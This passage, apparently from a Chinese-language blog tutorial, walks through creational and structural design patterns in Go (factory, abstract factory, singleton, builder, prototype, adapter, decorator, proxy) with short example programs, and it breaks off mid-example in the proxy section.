<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口Product，定义接口存在方法Use</span></span><br><span class="line"><span class="keyword">type</span> Product <span class="keyword">interface</span> &#123;</span><br><span class="line">	Use()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// productA继承Product，但外部不可见</span></span><br><span class="line"><span class="keyword">type</span> productA <span class="keyword">struct</span> &#123;</span><br><span class="line">	Product</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// productB继承Product，但外部不可见</span></span><br><span class="line"><span class="keyword">type</span> productB <span class="keyword">struct</span> &#123;</span><br><span class="line">	Product</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *productA)</span></span> Use() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;ProductA&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *productB)</span></span> Use() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;ProductB&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对外暴露工厂方法，根据参数创建不同的产品</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ProductFactory</span><span class="params">(name <span class="type">string</span>)</span></span> Product &#123;</span><br><span class="line">	<span class="keyword">switch</span> name &#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;A&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> &amp;productA&#123;&#125;</span><br><span class="line">	<span class="keyword">case</span> <span class="string">&quot;B&quot;</span>:</span><br><span class="line">		<span class="keyword">return</span> &amp;productB&#123;&#125;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Hello world&quot;</span>)</span><br><span class="line"></span><br><span class="line">	product := ProductFactory(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">	product.Use()</span><br><span class="line">	product = ProductFactory(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">	product.Use()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-抽象工厂模式"><a href="#2-抽象工厂模式" class="headerlink" title="2. 抽象工厂模式"></a>2. 抽象工厂模式</h3><img src="2020-07-19-01.png"/>

<p>最为抽象最具一般性，向客户端提供一个接口，使客户端在不必指定实例的具体类型的情况下创建多个实例族的实例对象。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个抽象工厂</span></span><br><span class="line"><span class="keyword">type</span> AbstractFactory <span class="keyword">interface</span> &#123;</span><br><span class="line">	CreateProduct(name <span class="type">string</span>) Product</span><br><span class="line">	CreateWorker(name <span class="type">string</span>) Worker</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义产品</span></span><br><span class="line"><span class="keyword">type</span> Product <span class="keyword">interface</span> &#123;</span><br><span class="line">	Use()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类产品A</span></span><br><span class="line"><span class="keyword">type</span> productA <span class="keyword">struct</span> &#123;</span><br><span class="line">	Product</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类产品B</span></span><br><span class="line"><span class="keyword">type</span> productB <span class="keyword">struct</span> &#123;</span><br><span class="line">	Product</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *productA)</span></span> Use() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;productA&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *productB)</span></span> Use() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;productB&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义产品工厂，生产产品</span></span><br><span class="line"><span class="keyword">type</span> ProductFactory <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *ProductFactory)</span></span> CreateProduct(name <span class="type">string</span>) Product &#123;</span><br><span class="line">	<span class="keyword">if</span> name == <span class="string">&quot;A&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> &amp;productA&#123;&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> name == <span class="string">&quot;B&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> &amp;productB&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现抽象工厂接口，但是没有具体实现</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *ProductFactory)</span></span> CreateWorker(name <span class="type">string</span>) Worker &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义工人</span></span><br><span class="line"><span class="keyword">type</span> Worker <span class="keyword">interface</span> &#123;</span><br><span class="line">	Work()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类工人A</span></span><br><span class="line"><span class="keyword">type</span> workerA <span class="keyword">struct</span> &#123;</span><br><span class="line">	Worker</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子类工人B</span></span><br><span class="line"><span class="keyword">type</span> workerB <span class="keyword">struct</span> &#123;</span><br><span class="line">	Worker</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *workerA)</span></span> Work() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;workerA&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *workerB)</span></span> Work() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;workerB&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义工人工厂</span></span><br><span class="line"><span class="keyword">type</span> WorkerFactory <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *WorkerFactory)</span></span> CreateWorker(name <span class="type">string</span>) Worker &#123;</span><br><span class="line">	<span class="keyword">if</span> name == <span class="string">&quot;A&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> &amp;workerA&#123;&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> name == <span class="string">&quot;B&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> &amp;workerB&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现抽象工厂接口，但是没有具体实现</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *WorkerFactory)</span></span> CreateProduct(name <span class="type">string</span>) Product &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用接口创建具体工厂</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetFactory</span><span class="params">(factoryType <span class="type">string</span>)</span></span> AbstractFactory &#123;</span><br><span class="line">	<span class="keyword">if</span> factoryType == <span class="string">&quot;product&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> &amp;ProductFactory&#123;&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> factoryType == <span class="string">&quot;worker&quot;</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> &amp;WorkerFactory&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 使用抽象工厂创建产品工厂</span></span><br><span class="line">	productFactory := GetFactory(<span class="string">&quot;product&quot;</span>)</span><br><span class="line">	productFactory.CreateProduct(<span class="string">&quot;A&quot;</span>).Use()</span><br><span class="line">	productFactory.CreateProduct(<span class="string">&quot;B&quot;</span>).Use()</span><br><span class="line">	<span class="comment">// 使用抽象工厂创建工人工厂</span></span><br><span class="line">	workerFactory := GetFactory(<span class="string">&quot;worker&quot;</span>)</span><br><span class="line">	workerFactory.CreateWorker(<span class="string">&quot;A&quot;</span>).Work()</span><br><span class="line">	workerFactory.CreateWorker(<span class="string">&quot;B&quot;</span>).Work()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-单例模式"><a href="#3-单例模式" class="headerlink" title="3. 单例模式"></a>3. <span id="instance">单例模式</span></h3><p>单例模式一般是用来让整个进程只有一个，一般是管理类。进程只有一个，再多线程情况下就需要考虑线程安全。常见的单例模式一般分为懒汉模式和饿汉模式。</p>
<p><strong>懒汉模式</strong></p>
<p>顾名思义，懒，就是用的时候才建立，不用不建立。分为线程安全的实现和非线程安全的实现，线程安全的实现会影响性能。一般由于两种线程安全的实现。</p>
<ul>
<li>单纯加锁</li>
<li>双重判断</li>
</ul>
<p><strong>饿汉模式</strong></p>
<p>开场就饿，进程开始就创建。默认就是线程安全的，但是要考虑头文件包含导致的多次创建。并且由于进程起来就创建，可能比较占用性能。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/********** 懒汉模式，非线程安全 **********/</span></span><br><span class="line"><span class="keyword">type</span> LasySingleton <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//建立私有变量</span></span><br><span class="line"><span class="keyword">var</span> instance *LasySingleton</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取单例对象的方法，引用传递返回</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetInstance</span><span class="params">()</span></span> *LasySingleton &#123;</span><br><span class="line">	<span class="keyword">if</span> instance == <span class="literal">nil</span> &#123;</span><br><span class="line">		instance = <span class="built_in">new</span>(LasySingleton)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> instance</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/********** 懒汉模式，线程安全 **********/</span></span><br><span class="line"><span class="keyword">type</span> SafeSingleton <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> safeInstance *SafeSingleton</span><br><span class="line"><span class="keyword">var</span> once sync.Once</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetSafeInstance</span><span class="params">()</span></span> *SafeSingleton &#123;</span><br><span class="line">	once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		safeInstance = <span class="built_in">new</span>(SafeSingleton)</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">return</span> safeInstance</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/********** 饿汉模式，线程安全 **********/</span></span><br><span class="line"><span class="keyword">type</span> HungrySingleton <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> hungrySingleton *HungrySingleton = <span class="built_in">new</span>(HungrySingleton)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetHungrySingleton</span><span class="params">()</span></span> *HungrySingleton &#123;</span><br><span class="line">	<span class="keyword">return</span> hungrySingleton</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 懒汉模式，非线程安全</span></span><br><span class="line">	instance1 := GetInstance()</span><br><span class="line">	instance2 := GetInstance()</span><br><span class="line">	<span class="keyword">if</span> instance1 == instance2 &#123;</span><br><span class="line">		<span class="built_in">println</span>(<span class="string">&quot;instance1 == instance2&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 懒汉模式，线程安全</span></span><br><span class="line">	instance3 := GetSafeInstance()</span><br><span class="line">	instance4 := GetSafeInstance()</span><br><span class="line">	<span class="keyword">if</span> instance3 == instance4 &#123;</span><br><span class="line">		<span class="built_in">println</span>(<span class="string">&quot;instance3 == instance4&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 饿汉模式，线程安全</span></span><br><span class="line">	instance5 := GetHungrySingleton()</span><br><span class="line">	instance6 := GetHungrySingleton()</span><br><span class="line">	<span class="keyword">if</span> instance5 == instance6 &#123;</span><br><span class="line">		<span class="built_in">println</span>(<span class="string">&quot;instance5 == instance6&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-建造者模式"><a href="#4-建造者模式" class="headerlink" title="4. 建造者模式"></a>4. 建造者模式</h3><ul>
<li>将复杂对象的构建与其表示分开，使同样的构建过程可以创建不同的表示。</li>
</ul>
<p>简单来说，存在一个厨师帮你构建一顿饭，包含一个个单独的菜组合。价格和列表不是厨师需要提供的，是饭菜（菜单）提供的。厨师就是建造者，需要的实例时饭菜。需要价格和列表找饭菜要！！！</p>
<ul>
<li>主要用于将一个一个基础的实现，使用建造者进行构建成一个对外接口类</li>
<li>建造者只负责处理复杂的构建，需要的能力时从对外接口类获取</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义单个饭菜的接口</span></span><br><span class="line"><span class="keyword">type</span> item <span class="keyword">interface</span> &#123;</span><br><span class="line">	GetName() <span class="type">string</span></span><br><span class="line">	GetPrice() <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义汉堡</span></span><br><span class="line"><span class="keyword">type</span> burger <span class="keyword">struct</span> &#123;</span><br><span class="line">	price <span class="type">float64</span></span><br><span class="line">	name  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *burger)</span></span> GetName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> b.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *burger)</span></span> GetPrice() <span class="type">float64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> b.price</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义饮料</span></span><br><span class="line"><span class="keyword">type</span> drink <span class="keyword">struct</span> &#123;</span><br><span class="line">	price <span class="type">float64</span></span><br><span class="line">	name  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *drink)</span></span> GetName() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> d.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *drink)</span></span> GetPrice() <span class="type">float64</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> d.price</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一顿饭的接口</span></span><br><span class="line"><span class="keyword">type</span> Meal <span class="keyword">struct</span> &#123;</span><br><span class="line">	items []item</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加饭菜</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Meal)</span></span> addItem(item item) &#123;</span><br><span class="line">	m.items = <span class="built_in">append</span>(m.items, item)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对外暴露获得价格的接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Meal)</span></span> GetCost() <span class="type">float64</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> cost <span class="type">float64</span></span><br><span class="line">	<span class="keyword">for</span> _, item := <span class="keyword">range</span> m.items &#123;</span><br><span class="line">		cost += item.GetPrice()</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> cost</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对外暴露获得名称的接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *Meal)</span></span> GetItems() []<span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> items []<span class="type">string</span></span><br><span class="line">	<span class="keyword">for</span> _, item := <span class="keyword">range</span> m.items &#123;</span><br><span class="line">		items = <span class="built_in">append</span>(items, item.GetName())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> items</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义饭菜建造者，提供套餐</span></span><br><span class="line"><span class="keyword">type</span> MealBuilder <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 套餐A，汉堡+饮料</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *MealBuilder)</span></span> CreateMealA() Meal &#123;</span><br><span class="line">	meal := Meal&#123;&#125;</span><br><span class="line">	meal.addItem(&amp;burger&#123;price: <span class="number">10</span>, name: <span class="string">&quot;burger&quot;</span>&#125;)</span><br><span class="line">	meal.addItem(&amp;drink&#123;price: <span class="number">5</span>, name: <span class="string">&quot;drink&quot;</span>&#125;)</span><br><span class="line">	<span class="keyword">return</span> meal</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 套餐B，2个汉堡+2个饮料</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *MealBuilder)</span></span> CreateMealB() Meal &#123;</span><br><span class="line">	meal := Meal&#123;&#125;</span><br><span class="line">	meal.addItem(&amp;burger&#123;price: <span class="number">10</span>, name: <span class="string">&quot;burger&quot;</span>&#125;)</span><br><span class="line">	meal.addItem(&amp;burger&#123;price: <span class="number">10</span>, name: <span class="string">&quot;burger&quot;</span>&#125;)</span><br><span class="line">	meal.addItem(&amp;drink&#123;price: <span class="number">5</span>, name: <span class="string">&quot;drink&quot;</span>&#125;)</span><br><span class="line">	meal.addItem(&amp;drink&#123;price: <span class="number">5</span>, name: <span class="string">&quot;drink&quot;</span>&#125;)</span><br><span class="line">	<span class="keyword">return</span> meal</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	builder := MealBuilder&#123;&#125;</span><br><span class="line">	<span class="comment">// 要一个套餐A，查看价格和列表</span></span><br><span class="line">	meal := builder.CreateMealA()</span><br><span class="line">	<span class="comment">// 价格和列表都是从饭菜获取，建造者不关心，仅进行构建</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Meal A: %s, cost: %.2f\n&quot;</span>, meal.GetItems(), meal.GetCost())</span><br><span class="line">	<span class="comment">// 要一个套餐B，查看价格和列表</span></span><br><span class="line">	meal = builder.CreateMealB()</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Meal B: %s, cost: %.2f\n&quot;</span>, meal.GetItems(), meal.GetCost())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="5-原型模式"><a href="#5-原型模式" class="headerlink" title="5. 原型模式"></a>5. 原型模式</h3><p>用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口，需要实现clone方法</span></span><br><span class="line"><span class="keyword">type</span> Painter <span class="keyword">interface</span> &#123;</span><br><span class="line">	Clone() Painter</span><br><span class="line">	DrawCrcle()</span><br><span class="line">	SetColor(color <span class="type">string</span>)</span><br><span class="line">	GetColor() <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PainterA <span class="keyword">struct</span> &#123;</span><br><span class="line">	color <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterA)</span></span> Clone() Painter &#123;</span><br><span class="line">	<span class="keyword">return</span> &amp;PainterA&#123;p.color&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterA)</span></span> DrawCrcle() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;PainterA DrawCircle&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterA)</span></span> SetColor(color <span class="type">string</span>) &#123;</span><br><span class="line">	p.color = color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterA)</span></span> GetColor() <span class="type">string</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> p.color</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 原型模式就是需要提供clone的接口，实现对对象的拷贝</span></span><br><span class="line">	a := PainterA&#123;&#125;</span><br><span class="line">	a.SetColor(<span class="string">&quot;red&quot;</span>)</span><br><span class="line">	b := a.Clone()</span><br><span class="line">	fmt.Println(b.GetColor()) <span class="comment">// red 拷贝后继承属性</span></span><br><span class="line">	b.SetColor(<span class="string">&quot;blue&quot;</span>)</span><br><span class="line">	fmt.Println(a.GetColor()) <span class="comment">// red 原对象没有改变</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="B．结构型模式"><a href="#B．结构型模式" class="headerlink" title="B．结构型模式"></a>B．结构型模式</h2><h3 id="6-适配器模式"><a href="#6-适配器模式" class="headerlink" title="6. 适配器模式"></a>6. 适配器模式</h3><ul>
<li>关键在于兼容，将原有接口兼容当前使用</li>
<li>兼容了当前框架的操作</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> module <span class="keyword">struct</span> &#123;</span><br><span class="line">	a <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *module)</span></span> start() &#123;</span><br><span class="line">	m.a = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *module)</span></span> stop() &#123;</span><br><span class="line">	m.a = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> moduleAdapter <span class="keyword">struct</span> &#123;</span><br><span class="line">	module</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *moduleAdapter)</span></span> init() &#123;</span><br><span class="line">	m.start()</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *moduleAdapter)</span></span> uninit() &#123;</span><br><span class="line">	m.stop()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	m := moduleAdapter&#123;&#125;</span><br><span class="line">	m.init()</span><br><span class="line">	m.uninit()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="7-组合（部分-整体）模式"><a href="#7-组合（部分-整体）模式" class="headerlink" title="7. 组合（部分-整体）模式"></a>7. 组合（部分-整体）模式</h3><p>将对象组合成树形结构以表示“部分-整体”的层次结构</p>
<h3 id="8-装饰器模式"><a href="#8-装饰器模式" class="headerlink" title="8. 装饰器模式"></a>8. 装饰器模式</h3><p>动态给对象添加额外职责，比通过生成子类来增加功能更加灵活</p>
<ul>
<li>关键在于加强，原始类的所有接口都进行了实现</li>
<li>比如存在一个接口实现了非线程安全的一些方法，使用一个装饰器将所有的方法变成线程安全的调用</li>
<li>比如存在一个接口实现了画图，使用一个装饰器将画的图染成红色</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口画家</span></span><br><span class="line"><span class="keyword">type</span> Painter <span class="keyword">interface</span> &#123;</span><br><span class="line">	DrawCircle()</span><br><span class="line">	DrawRectangle()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现一个画家</span></span><br><span class="line"><span class="keyword">type</span> PainterA <span class="keyword">struct</span> &#123;</span><br><span class="line">	Painter</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PainterDecorator <span class="keyword">struct</span> &#123;</span><br><span class="line">	A PainterA <span class="comment">// 本身持有一个画家A</span></span><br><span class="line">	Painter</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterA)</span></span> DrawCircle() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;PainterA DrawCircle&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterA)</span></span> DrawRectangle() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;PainterA DrawRectangle&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterDecorator)</span></span> DrawCircle() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Use red color&quot;</span>) <span class="comment">// 增加能力</span></span><br><span class="line">	p.A.DrawCircle()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterDecorator)</span></span> DrawRectangle() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Use red color&quot;</span>) <span class="comment">// 增加能力</span></span><br><span class="line">	p.A.DrawRectangle()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 使用原始画家可以进行操作</span></span><br><span class="line">	painter := &amp;PainterA&#123;&#125;</span><br><span class="line">	painter.DrawCircle()</span><br><span class="line">	painter.DrawRectangle()</span><br><span class="line">	<span class="comment">// 使用装饰器加强了画家，做同样的操作</span></span><br><span class="line">	painter1 := &amp;PainterDecorator&#123;</span><br><span class="line">		A: PainterA&#123;&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">	painter1.DrawCircle()</span><br><span class="line">	painter1.DrawRectangle()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-代理模式"><a href="#9-代理模式" class="headerlink" title="9. 代理模式"></a>9. 代理模式</h3><ul>
<li>关键在于隔离，不直接访问原始对象</li>
<li>和装饰器不同的时，代理模式更多的是封装原始接口，但不改变原始接口的能力</li>
<li>比如加上日志打印或者初始化操作，这些并不改变原始接口的能力，并且可以将原始类的实现细节隐藏</li>
<li>装饰器并不隐藏原始实现</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口，但外部不可见</span></span><br><span class="line"><span class="keyword">type</span> painter <span class="keyword">interface</span> &#123;</span><br><span class="line">	init()</span><br><span class="line">	drawCircle()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义画家继承接口，同样外部不可见</span></span><br><span class="line"><span class="keyword">type</span> painterA <span class="keyword">struct</span> &#123;</span><br><span class="line">	painter</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义代理类，封装了painterA</span></span><br><span class="line"><span class="keyword">type</span> PainterProxy <span class="keyword">struct</span> &#123;</span><br><span class="line">	a painterA</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *painterA)</span></span> init() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;painterA init&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *painterA)</span></span> drawCircle() &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;painterA DrawCircle&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 代理类处理了初始化，但不修改painterA的实现</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PainterProxy)</span></span> DrawCircle() &#123;</span><br><span class="line">	<span class="keyword">if</span> p.a.painter == <span class="literal">nil</span> &#123;</span><br><span class="line">		p.a = painterA&#123;&#125;</span><br><span class="line">		p.a.init()</span><br><span class="line">	&#125;</span><br><span class="line">	p.a.drawCircle()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 